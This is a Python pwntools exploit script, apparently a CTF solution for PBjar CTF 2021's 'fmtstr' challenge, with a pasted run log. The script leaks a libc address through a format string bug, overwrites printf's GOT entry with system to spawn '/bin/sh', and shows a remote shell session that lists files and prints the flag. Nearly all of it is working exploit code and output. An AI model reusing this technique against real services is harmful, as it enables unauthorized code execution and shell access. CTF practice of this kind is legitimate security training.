from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './fmtstr'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42002
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.31.so")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
  libc = elf.libc
  #libc = ELF("./libc-2.31.so")

s.sendlineafter("(also, I fixed the overflow here :clown:)", "N")

# libc leak
s.sendlineafter("input:\n", b"%7$s----" + p64(elf.got.puts))
puts_addr = u64(s.recvuntil("-")[:-1] + b"\x00\x00")
libc_base = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
print("puts_addr =", hex(puts_addr))
print("libc_base =", hex(libc_base))

# GOT overwrite (printf => system) using FSB
index = 6
writes = {elf.got.printf: system_addr}
buf = fmtstr_payload(index, writes, write_size='byte')
s.sendlineafter("input:\n", buf)

s.sendlineafter("input:\n", "/bin/sh\x00")

s.interactive()

'''
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr$ python3 solve.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/fmtstr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
[+] Opening connection to 143.198.127.103 on port 42002: Done
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_FmtStr/fmtstr/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr = 0x7f5db80f05f0
libc_base = 0x7f5db807a000
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 2028
lrwxrwxrwx   1 root root       7 Aug 27 07:16 bin -> usr/bin
drwxr-xr-x   2 root root    4096 Apr 15  2020 boot
drwxr-xr-x   5 root root     340 Sep 17 04:41 dev
drwxr-xr-x   1 root root    4096 Sep 17 04:41 etc
-rw-r--r--   1 root root      59 Sep 17 04:28 flag.txt
drwxr-xr-x   1 root root    4096 Sep 17 04:40 home
-rwxr-xr-x   1 root root  177928 Sep 17 04:28 ld-2.31.so
lrwxrwxrwx   1 root root       7 Aug 27 07:16 lib -> usr/lib
lrwxrwxrwx   1 root root       9 Aug 27 07:16 lib32 -> usr/lib32
lrwxrwxrwx   1 root root       9 Aug 27 07:16 lib64 -> usr/lib64
-rwxr-xr-x   1 root root 1839792 Sep 17 04:28 libc-2.31.so
lrwxrwxrwx   1 root root      10 Aug 27 07:16 libx32 -> usr/libx32
drwxr-xr-x   2 root root    4096 Aug 27 07:16 media
drwxr-xr-x   2 root root    4096 Aug 27 07:16 mnt
drwxr-xr-x   2 root root    4096 Aug 27 07:16 opt
dr-xr-xr-x 264 root root       0 Sep 17 04:41 proc
drwx------   2 root root    4096 Aug 27 07:27 root
drwxr-xr-x   5 root root    4096 Aug 27 07:27 run
lrwxrwxrwx   1 root root       8 Aug 27 07:16 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Aug 27 07:16 srv
dr-xr-xr-x  13 root root       0 Sep 17 04:41 sys
drwxrwxrwt   1 root root    4096 Sep 17 04:38 tmp
drwxr-xr-x   1 root root    4096 Aug 27 07:16 usr
drwxr-xr-x   1 root root    4096 Aug 27 07:27 var
$ cat flag.txt
flag{w1th_just_s0m3_str1ngz_1_b3c4m3_4_g0d_4t_r3d1r3ct10n}
'''
